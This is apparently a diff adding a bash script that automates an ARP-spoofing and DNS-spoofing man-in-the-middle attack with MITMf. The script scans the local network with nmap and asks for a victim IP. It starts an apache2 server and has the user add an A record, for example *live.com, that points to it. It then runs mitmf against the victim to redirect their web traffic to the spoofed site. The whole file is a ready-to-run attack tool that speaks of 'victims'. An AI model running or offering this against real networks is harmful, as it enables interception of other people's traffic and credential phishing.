@@ -1,0 +1,31 @@
+#!/bin/bash
+echo "Script Description: This script uses 'MITMf' to redirect traffic in a target device to any website"
+echo ~~Tools required :
+echo "	1-MITMf: apt-get install mitmf"
+
+echo ~~Listing network interfaces \"ifconfig\"
+ifconfig
+read -p "~~Enter the network interface name that will be used: " interfaceName
+echo $interfaceName selected
+echo ~~Getting the network default gateway \"ip route | grep default\"
+defGateway=`ip route | grep default | awk  '{print $3}'`
+echo "~~Scanning for connected devices \"nmap -sn $defGateway/24\""
+nmap -sn $defGateway/24
+read -p "~~Enter target device IP: " ClientIP
+echo ~~Steps to follow: 
+echo "	1-Get the IP of the website we want to redirect the victim to."
+echo "	2-Run the apache2 server if the website is local."
+echo "	3-Modify MITMf configuration file."
+echo "	4-Use “mitmf” to start a MITM attack with DNS spoofing."
+echo "	5-Visit the spoofed website on the victim device."
+echo "~~Getting the IP of our Kali machine in which our server will be running \"ifconfig | awk 'FNR==2{print $2}'\""
+serverIP=`ifconfig | awk 'FNR==2{print $2}'`
+echo '~~Starting the apache2 server \"service apache2 start\"'
+service apache2 start
+echo "~~Add an A record (eg: *live.com=$serverIP) to redirect victims from website X to the one running on our machine \"leafpad /etc/mitmf/mitmf.conf\""
+leafpad /etc/mitmf/mitmf.conf
+echo "~~Starting the DNS spoofing attack \"mitmf --arp --spoof --gateway $defGateway --target $ClientIP -i $interfaceName --dns\""
+echo ~~Now visit the spoofed website in the client device.
+mitmf --arp --spoof --gateway $defGateway --target $ClientIP -i $interfaceName --dns
+
+
